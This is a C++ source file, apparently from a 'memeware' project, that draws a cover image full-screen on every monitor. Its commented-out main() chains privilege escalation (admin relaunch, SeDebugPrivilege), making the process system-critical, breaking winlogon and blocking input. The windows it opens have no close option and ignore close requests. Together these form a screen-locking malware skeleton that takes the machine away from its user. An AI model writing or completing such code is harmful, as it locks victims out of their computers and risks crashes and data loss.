#include "CoverImage.h"
#include "EZProgram.h"
#include "Helper.h"
#include "SysControl.h"
#include <thread>
#include <iostream>
#include <vector>

UINT32 OpenWindowCount = 0;

void Update(EZ::Program* program) {
	ID2D1Bitmap* mysteryImage = *program->GetUserDataAs<ID2D1Bitmap*>();
	D2D1_SIZE_U rendererSize = program->GetRenderer()->GetSize();
	D2D1_RECT_L rendererRect = EZ::RectL(0, 0, rendererSize.width, rendererSize.height);
	program->GetRenderer()->DrawBitmap(mysteryImage, rendererRect);
}

void CoverMonitor(HMONITOR monitor) {
	OpenWindowCount++;
	std::thread monitorThread([monitor]() {
		LONGLONG startTime = 0;
		QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&startTime));

		EZ::ClassSettings classSettings = { };
		classSettings.ThisThreadOnly = TRUE;
		classSettings.NoCloseOption = TRUE;

		MONITORINFO monitorInfo;
		monitorInfo.cbSize = sizeof(MONITORINFO);
		GetMonitorInfo(monitor, &monitorInfo);

		EZ::WindowSettings windowSettings = { };
		windowSettings.HideInTaskbar = TRUE;
		windowSettings.Title = L"Mystery Experience Host Window";
		windowSettings.LaunchHidden = TRUE;
		//windowSettings.TopMost = TRUE;
		windowSettings.StylePreset = EZ::WindowStylePreset::Boarderless;
		windowSettings.InitialX = monitorInfo.rcMonitor.left;
		windowSettings.InitialY = monitorInfo.rcMonitor.top;
		windowSettings.InitialWidth = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
		windowSettings.InitialHeight = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;

		EZ::RendererSettings rendererSettings = { };
		rendererSettings.UseVSync = TRUE;
		rendererSettings.OptimizeForSingleThread = TRUE;

		ID2D1Bitmap* mysteryImage = nullptr;

		EZ::ProgramSettings programSettings = { };
		programSettings.IgnoreWMClose = TRUE;
		programSettings.PreformanceLogInterval = 60;
		programSettings.UpdateCallback = Update;
		programSettings.UserData = &mysteryImage;

		EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);

		mysteryImage = program->GetRenderer()->LoadBitmap(L"D:\\Coding\\C++\\MysteryMemeware2\\CoverImage.bmp");

		LONGLONG timeNow = 0;
		QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));

		std::cout << "Took: " << (timeNow - startTime) << " ticks for sub thread to finish initializing." << std::endl;

		program->Run();

		delete program;

		OpenWindowCount--;
		});
	monitorThread.detach();
}

struct MonitorList {
	DWORD length;
	HMONITOR* list;
};
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
	std::vector<HMONITOR>* monitors = reinterpret_cast<std::vector<HMONITOR>*>(dwData);

	monitors->push_back(hMonitor);

	return TRUE;
}
MonitorList GetMonitors() {
	std::vector<HMONITOR>* monitors = new std::vector<HMONITOR>();
	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, reinterpret_cast<LPARAM>(monitors));

	DWORD length = monitors->size();
	HMONITOR* monitorsArray = new HMONITOR[length];
	for (DWORD i = 0; i < length; ++i) {
		monitorsArray[i] = (*monitors)[i];
	}

	delete monitors;

	return { length, monitorsArray };
}

int main() {
	EZ::ClassSettings classSettings = { };
	classSettings.ThisThreadOnly = TRUE;

	EZ::WindowSettings windowSettings = { };
	windowSettings.LaunchHidden = TRUE;

	EZ::RendererSettings rendererSettings = { };

	ID2D1Bitmap* mysteryImage = nullptr;

	EZ::ProgramSettings programSettings = { };
	programSettings.PreformanceLogInterval = 1000;
	programSettings.UpdateCallback = Update;
	programSettings.UserData = &mysteryImage;

	EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);

	mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);

	program->Run();

	delete program;
}

/*
int main() {
	if (!IsAdmin()) {
		RelaunchAsAdmin();
		return 0;
	}

	if (!HasUIAccess()) {
		RelaunchWithUIAccess();
		return 0;
	}

	TakeSEDebugPrivilege();
	MakeSystemCritical();

	TakeSEDebugPrivilege();
	BreakWinlogon();

	BlockInput();



	LONGLONG startTime = 0;
	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&startTime));

	MonitorList monitors = GetMonitors();

	for (DWORD i = 0; i < monitors.length; i++)
	{
		CoverMonitor(monitors.list[i]);
	}

	LONGLONG timeNow = 0;
	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));

	std::cout << "Took: " << (timeNow - startTime) << " ticks for main thread to finish starting sub-threads." << std::endl;

	while (OpenWindowCount > 0) {}

	delete[] monitors.list;
	return 0;
}
*/